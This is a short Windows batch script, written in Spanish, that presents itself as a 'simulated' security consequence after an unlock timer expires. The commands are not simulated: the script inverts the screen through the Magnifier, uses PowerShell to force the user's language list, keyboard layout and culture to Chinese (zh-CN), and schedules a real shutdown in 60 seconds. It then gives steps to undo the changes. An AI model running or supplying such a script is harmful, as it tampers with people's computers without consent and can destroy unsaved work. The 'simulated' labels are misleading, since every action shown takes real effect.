@echo off
Title 💀 CONSECUENCIA - Acciones Remotas Iniciadas 💀
echo =========================================================
echo  El tiempo de desbloqueo ha expirado.
echo  Se ha activado una consecuencia de seguridad simulada.
echo =========================================================
echo.

:: 1. Consecuencia LOLBAS - Inversion de Color de Pantalla
echo [LOLBAS Simulado] -> Usando 'magnify' para la Inversion de Pantalla...
start "" "magnify" -n -inv
echo.

:: 2. Consecuencia: Cambio de Teclado (Chino Simplificado LCID 2052)
echo [Modificacion de Configuracion] -> Cambiando la distribucion de teclado a Chino...
powershell -Command "Add-Type -AssemblyName System.Runtime; $ChineseLCID = 2052; $List = Get-WinUserLanguageList; if (-not ($List | Where-Object { $_.LanguageTag -eq 'zh-CN' })) { $List.Add('zh-CN'); Set-WinUserLanguageList $List -Force }; $Culture = Get-Culture; $Culture.KeyboardLayoutId = $ChineseLCID; $Culture | Set-Culture"
echo   -> Teclado cambiado a 'zh-CN'.

:: 3. Apagado Programado Falso (Persistencia Simulada)
echo [Persistencia Simulado] -> Se ha programado un Apagado de Emergencia en 60 segundos.
shutdown /s /t 60
echo.

echo =========================================================
echo  INSTRUCCIONES DE REMEDIACIÓN:
echo  1. Abra CMD y ejecute: shutdown /a
echo  2. Use Cleanup_Tool.bat para el resto de la limpieza.
echo =========================================================

pause > nul
exit
